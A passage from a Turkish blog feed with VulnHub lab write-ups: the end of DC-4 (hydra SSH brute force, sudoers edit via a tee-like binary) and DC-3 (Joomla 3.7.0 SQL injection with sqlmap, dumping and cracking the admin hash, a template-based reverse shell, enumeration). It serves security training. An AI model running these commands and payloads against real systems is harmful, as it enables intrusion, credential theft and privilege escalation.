<p>Burpsuite aracı ile giden istekler incelenir. İstek gönderilirken boşluk karakteri + ile kodlanmaktadır. wget aracı ile shell alıncak dosya yüklenir. Ancak dizine yazma yetkisi sadece root kullanıcısına ait olduğundan başarısız olunur.</p>

    <img src="/images/vulnhub/dc4/bp1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>ls</strong> komutu ile dizinlerde gezinilerek keşif yapılır. jim kullanıcısının home dizini altında bir parola listesi bulunur.</p>

    <img src="/images/vulnhub/dc4/bp2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>cat</strong> komutu ile liste görüntülenir ve localhost&rsquo;a ssh servisine yapılacak olan brute force saldırısı için kayıt edilir.</p>

    <img src="/images/vulnhub/dc4/bp3.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Tespit edilen kullanıcılardan wordlist oluşturularak ve hydra aracı ile ssh servisine brute force saldırısı yapılır.</p>

    <img src="/images/vulnhub/dc4/bp4.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hydra -L user.lst -P pass.lst ssh://192.168.56.113
</code></pre></div>
    <img src="/images/vulnhub/dc4/hydra.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<p>Elde edilen bilgiler ile ssh bağlantısı yapılır. <code>Sudo -l</code> komutu girildiğinde parola istenmektedir. Parola rastgele girildiğinde hatalı deneme kullanıcıya mail olarak gönderilmektedir. <em>/var/mail/</em> dizini altında yer alan jim dosyası okunarak kullanıcı mail kutusu kontrol edilir. Charles kullanıcısından gelen bir mailde parola bilgisi yer almaktadır. Charles kullanıcısına geçiş yapılır.</p>

    <img src="/images/vulnhub/dc4/charlesmail.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p>Charles kullanıcısına ait sudo yetkileri kontrol edilir.</p>

    <img src="/images/vulnhub/dc4/sudo.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>Teehee</strong> adlı uygulamanın root yetkisi ile kullanılabileceği tespit edilir. Uygulamanın içeriğine bakılır. Uygulamanın tee uygulaması ile aynı olduğu görülür.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strings /usr/bin/teehee
</code></pre></div>
    <img src="/images/vulnhub/dc4/tee.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>tee</strong> uygulaması kendisine gönderilen çıktıyı hem dosyaya hemde standart çıkış olan terminal ekranına basar. Sudoers dosyasına charles kullanıcısının tüm komutlarını çalıştırması için düzenlenme yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;charles ALL=(ALL) ALL&#34;</span> | sudo teehee -a /etc/sudoers
</code></pre></div><p><code>Sudo su</code> ile root kullanıcısına geçilerek <em>/root</em> dizininde yer alan flag değeri okunur.</p>

    <img src="/images/vulnhub/dc4/rootflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>VULNHUB DC-3 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/vulnhub-dc-3-write-up/</link>
            <pubDate>Tue, 29 Sep 2020 13:06:24 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/vulnhub-dc-3-write-up/</guid>
            <description>Merhaba, Bu yazımda sizlere VULNHUB &amp;lsquo;da yer alan DC-3 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip; 😊
1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
netdiscover -i eth1  Nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.
sudo nmap -sV -sC -p- 192.168.56.111  80 portunda çalışan web servisine tarayıcından istek atılır.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/dc-32,312/">VULNHUB</a> &lsquo;da yer alan DC-3 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip; 😊</p>
<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
<p>Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/dc3/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.111
</code></pre></div>
    <img src="/images/vulnhub/dc3/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>80 portunda çalışan web servisine tarayıcından istek atılır. Sayfa kaynak kodu incelendiğinde Joomla CMS uygulamasının çalıştığı görülmektedir.</p>

    <img src="/images/vulnhub/dc3/web.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Web dizin taraması gerçekleştirilir. Ayrıca google&rsquo;da arama yapıldığında <em><strong>administrator/manifests/files/joomla.xml</strong></em> içerisnde uygulama sürümü hakkında bilgi yer aldığı tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.56.111 -w /usr/share/wordlists/dirb/big.txt
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.56.111
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/28 13:46:56 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/administrator (Status: 301)
/bin (Status: 301)
/cache (Status: 301)
/cli (Status: 301)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/server-status (Status: 403)
/templates (Status: 301)
/tmp (Status: 301)
===============================================================
2020/09/28 13:47:00 Finished
===============================================================
</code></pre><p>Web dizin taramasında joomla uygulamasının standart dosyaları dışında bir dosya tespit edilememektedir.</p>
<p>http://192.168.56.111/administrator/manifests/files/joomla.xml adresine istek atılırak sürüm bilgisi tespit edilir. Sürümün 3.7.0 olduğu görülmektedir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
<span style="color:#f92672">&lt;extension</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;3.6&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">method=</span><span style="color:#e6db74">&#34;upgrade&#34;</span><span style="color:#f92672">&gt;</span>
	<span style="color:#f92672">&lt;name&gt;</span>files_joomla<span style="color:#f92672">&lt;/name&gt;</span>
	<span style="color:#f92672">&lt;author&gt;</span>Joomla! Project<span style="color:#f92672">&lt;/author&gt;</span>
	<span style="color:#f92672">&lt;authorEmail&gt;</span>admin@joomla.org<span style="color:#f92672">&lt;/authorEmail&gt;</span>
	<span style="color:#f92672">&lt;authorUrl&gt;</span>www.joomla.org<span style="color:#f92672">&lt;/authorUrl&gt;</span>
	<span style="color:#f92672">&lt;copyright&gt;</span>(C) 2005 - 2017 Open Source Matters. All rights reserved<span style="color:#f92672">&lt;/copyright&gt;</span>
	<span style="color:#f92672">&lt;license&gt;</span>GNU General Public License version 2 or later; see LICENSE.txt<span style="color:#f92672">&lt;/license&gt;</span>
	<span style="color:#f92672">&lt;version&gt;</span>3.7.0<span style="color:#f92672">&lt;/version&gt;</span>
	<span style="color:#f92672">&lt;creationDate&gt;</span>April 2017<span style="color:#f92672">&lt;/creationDate&gt;</span>
	<span style="color:#f92672">&lt;description&gt;</span>FILES_JOOMLA_XML_DESCRIPTION<span style="color:#f92672">&lt;/description&gt;</span>

	<span style="color:#f92672">&lt;scriptfile&gt;</span>administrator/components/com_admin/script.php<span style="color:#f92672">&lt;/scriptfile&gt;</span>

....
</code></pre></div><p>Joomla sürümünün güncel olmadığı görülmektedir. Searchsploit ile exploit araması yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit joomla 3.7
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Joomla! 3.7 - SQL Injection                   | php/remote/44227.php
Joomla! 3.7.0 - <span style="color:#e6db74">&#39;com_fields&#39;</span> SQL Injection    | php/webapps/42033.txt
Joomla! Component ARI Quiz 3.7.4 - SQL Inject | php/webapps/46769.txt
Joomla! Component com_realestatemanager 3.7 - | php/webapps/38445.txt
Joomla! Component Easydiscuss &lt; 4.0.21 - Cros | php/webapps/43488.txt
Joomla! Component J2Store &lt; 3.3.7 - SQL Injec | php/webapps/46467.txt
Joomla! Component JomEstate PRO 3.7 - <span style="color:#e6db74">&#39;id&#39;</span> SQ | php/webapps/44117.txt
Joomla! Component Jtag Members Directory 5.3. | php/webapps/43913.txt
Joomla! Component Quiz Deluxe 3.7.4 - SQL Inj | php/webapps/42589.txt
---------------------------------------------- ---------------------------------
</code></pre></div><p>İkinci sırada yer alan exploit -m parametresi ile indirilip incelenir. Uygulamada SqlInjection zafiyeti oluğu görülmektedir. Sqlmap aracı kullanılarak zafiyet sömürülür.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917


URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27


Using Sqlmap: 

sqlmap -u &#34;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)
</code></pre></div><p>İlk olarak veritabanları tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent --dbs -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
</code></pre></div>
    <img src="/images/vulnhub/dc3/sqlmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Tespit edilen joomla veritabanı seçilerek, veritabanında yer alan tablolar tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent -D joomladb --tables -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Database: joomladb
[76 tables]
+---------------------+
| #__assets           |
| #__associations     |
| #__banner_clients   |
| #__banner_tracks    |
| #__banners          |
| #__bsms_admin       |
| #__bsms_books       |
| #__bsms_comments    |
| #__bsms_locations   |
| #__bsms_mediafiles  |
| #__bsms_message_typ |
| #__bsms_podcast     |
| #__bsms_series      |
| #__bsms_servers     |
| #__bsms_studies     |
| #__bsms_studytopics |
| #__bsms_teachers    |
| #__bsms_templatecod |
| #__bsms_templates   |
| #__bsms_timeset     |
| #__bsms_topics      |
| #__bsms_update      |
| #__categories       |
| #__contact_details  |
| #__content_frontpag |
| #__content_rating   |
| #__content_types    |
| #__content          |
| #__contentitem_tag_ |
| #__core_log_searche |
| #__extensions       |
| #__fields_categorie |
| #__fields_groups    |
| #__fields_values    |
| #__fields           |
| #__finder_filters   |
| #__finder_links_ter |
| #__finder_links     |
| #__finder_taxonomy_ |
| #__finder_taxonomy  |
| #__finder_terms_com |
| #__finder_terms     |
| #__finder_tokens_ag |
| #__finder_tokens    |
| #__finder_types     |
| #__jbsbackup_timese |
| #__jbspodcast_times |
| #__languages        |
| #__menu_types       |
| #__menu             |
| #__messages_cfg     |
| #__messages         |
| #__modules_menu     |
| #__modules          |
| #__newsfeeds        |
| #__overrider        |
| #__postinstall_mess |
| #__redirect_links   |
| #__schemas          |
| #__session          |
| #__tags             |
| #__template_styles  |
| #__ucm_base         |
| #__ucm_content      |
| #__ucm_history      |
| #__update_sites_ext |
| #__update_sites     |
| #__updates          |
| #__user_keys        |
| #__user_notes       |
| #__user_profiles    |
| #__user_usergroup_m |
| #__usergroups       |
| #__users            |
| #__utf8_conversion  |
| #__viewlevels       |
+---------------------+
</code></pre></div><p>Joomla veritabanında yer alan <em><strong>#__users</strong></em> tablosunda yer alan kolonlar tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent -D joomladb -T <span style="color:#e6db74">&#39;#__users&#39;</span> --columns -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Database: joomladb
Table: #__users
[6 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | numeric     |
| name     | non-numeric |
| password | non-numeric |
| email    | non-numeric |
| params   | non-numeric |
| username | non-numeric |
+----------+-------------+
</code></pre></div><p>Tablodaki username,password ve email sutunlarında yer alan bilgiler dump edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent -D joomladb -T <span style="color:#e6db74">&#39;#__users&#39;</span> -C username,password,email --dump -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Database: joomladb
Table: #__users
[1 entry]
+----------+--------------------------------------------------------------+--------------------------+
| username | password                                                     | email                    |
+----------+--------------------------------------------------------------+--------------------------+
| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | freddy@norealaddress.net |
+----------+--------------------------------------------------------------+--------------------------+
</code></pre></div><p>Admin kullanıcısına ait hash bilgisi elde edilmektedir. Elde edilen hash bilgisi hashcat aracı ile sözlük saldırısı yapılarak kırılır. Elde edilen hash türü tespit edilir.</p>

    <img src="/images/vulnhub/dc3/hashcatt.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -m <span style="color:#ae81ff">3200</span> --force hash.txt /usr/share/wordlists/rockyou.txt 
</code></pre></div>
    <img src="/images/vulnhub/dc3/hashcat.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<p>Admin kullancısı ile sisteme giriş yapılır. Daha sonra template içerisinde yer alan protostar temasındaki error.php dosyası reverse shell alacak şekilde düzenlenir.</p>

    <img src="/images/vulnhub/dc3/login.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><em>http://192.168.56.111/template/protostar/error.php</em> adresine istek atılarak ncat ile dinlenen porta bağlantı sağlanılır.</p>
<p>
    <img src="/images/vulnhub/dc3/shell.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


Python pty modulü kullanılarak etkileşimli kabuğa geçilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</code></pre></div><h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p>Yetki yükseltmek için LinEnum betiği kullanılırak sistem hakkında bilgi toplanır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#########################################################</span>
<span style="color:#75715e"># Local Linux Enumeration &amp; Privilege Escalation Script #</span>
<span style="color:#75715e">#########################################################</span>
<span style="color:#75715e"># www.rebootuser.com</span>
<span style="color:#75715e"># version 0.982</span>

<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Debug Info
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Thorough tests <span style="color:#f92672">=</span> Disabled


Scan started at:
Tue Sep <span style="color:#ae81ff">29</span> 08:00:57 AEST <span style="color:#ae81ff">2020</span>


<span style="color:#75715e">### SYSTEM ##############################################</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kernel information:
Linux DC-3 4.4.0-21-generic <span style="color:#75715e">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span>


<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kernel information <span style="color:#f92672">(</span>continued<span style="color:#f92672">)</span>:
Linux version 4.4.0-21-generic <span style="color:#f92672">(</span>buildd@lgw01-06<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>gcc version 5.3.1 <span style="color:#ae81ff">20160413</span> <span style="color:#f92672">(</span>Ubuntu 5.3.1-14ubuntu2<span style="color:#f92672">)</span> <span style="color:#f92672">)</span> <span style="color:#75715e">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016</span>


<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Specific release information:
DISTRIB_ID<span style="color:#f92672">=</span>Ubuntu
DISTRIB_RELEASE<span style="color:#f92672">=</span>16.04
DISTRIB_CODENAME<span style="color:#f92672">=</span>xenial
DISTRIB_DESCRIPTION<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ubuntu 16.04 LTS&#34;</span>
NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ubuntu&#34;</span>
VERSION<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;16.04 LTS (Xenial Xerus)&#34;</span>
ID<span style="color:#f92672">=</span>ubuntu
ID_LIKE<span style="color:#f92672">=</span>debian
PRETTY_NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ubuntu 16.04 LTS&#34;</span>
VERSION_ID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;16.04&#34;</span>
HOME_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.ubuntu.com/&#34;</span>
SUPPORT_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://help.ubuntu.com/&#34;</span>
BUG_REPORT_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://bugs.launchpad.net/ubuntu/&#34;</span>
UBUNTU_CODENAME<span style="color:#f92672">=</span>xenial

<span style="color:#75715e">### USER/GROUP ##########################################</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Current user/group info:
uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>


<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> It looks like we have some admin users:
uid<span style="color:#f92672">=</span>104<span style="color:#f92672">(</span>syslog<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>108<span style="color:#f92672">(</span>syslog<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>108<span style="color:#f92672">(</span>syslog<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dc3<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dc3<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dc3<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,110<span style="color:#f92672">(</span>lxd<span style="color:#f92672">)</span>,117<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,118<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>


<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Contents of /etc/passwd:
root❌0:0:root:/root:/bin/bash
daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin❌2:2:bin:/bin:/usr/sbin/nologin
sys❌3:3:sys:/dev:/usr/sbin/nologin
sync❌4:65534:sync:/bin:/bin/sync
games❌5:60:games:/usr/games:/usr/sbin/nologin
man❌6:12:man:/var/cache/man:/usr/sbin/nologin
lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail❌8:8:mail:/var/mail:/usr/sbin/nologin
news❌9:9:news:/var/spool/news:/usr/sbin/nologin
uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy❌13:13:proxy:/bin:/usr/sbin/nologin
www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
backup❌34:34:backup:/var/backups:/usr/sbin/nologin
list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats❌41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync❌100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network❌101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve❌102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy❌103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog❌104:108::/home/syslog:/bin/false
_apt❌105:65534::/nonexistent:/bin/false
lxd❌106:65534::/var/lib/lxd/:/bin/false
mysql❌107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus❌108:112::/var/run/dbus:/bin/false
uuidd❌109:113::/run/uuidd:/bin/false
dnsmasq❌110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd❌111:65534::/var/run/sshd:/usr/sbin/nologin
dc3❌1000:1000:dc3,,,:/home/dc3:/bin/bash

<span style="color:#75715e">### ENVIRONMENTAL #######################################</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Environment information:
APACHE_PID_FILE<span style="color:#f92672">=</span>/var/run/apache2/apache2.pid
APACHE_RUN_USER<span style="color:#f92672">=</span>www-data
PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOG_DIR<span style="color:#f92672">=</span>/var/log/apache2
PWD<span style="color:#f92672">=</span>/tmp
LANG<span style="color:#f92672">=</span>C
APACHE_RUN_GROUP<span style="color:#f92672">=</span>www-data
SHLVL<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
APACHE_RUN_DIR<span style="color:#f92672">=</span>/var/run/apache2
APACHE_LOCK_DIR<span style="color:#f92672">=</span>/var/lock/apache2
_<span style="color:#f92672">=</span>/usr/bin/env

<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Can we read/write sensitive files:
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1614</span> Apr <span style="color:#ae81ff">25</span> 16:27 /etc/passwd
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">806</span> Apr <span style="color:#ae81ff">25</span> 16:26 /etc/group
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">575</span> Oct <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2015</span> /etc/profile
-rw-r----- <span style="color:#ae81ff">1</span> root shadow <span style="color:#ae81ff">968</span> Apr <span style="color:#ae81ff">25</span> 16:27 /etc/shadow

<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> SUID files:
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">43316</span> May  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2014</span> /bin/ping6
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">157424</span> Mar <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2019</span> /bin/ntfs-3g
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">26492</span> Apr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2016</span> /bin/umount
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">38900</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /bin/su
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">30112</span> Jul <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2016</span> /bin/fusermount
-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">34812</span> Apr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2016</span> /bin/mount
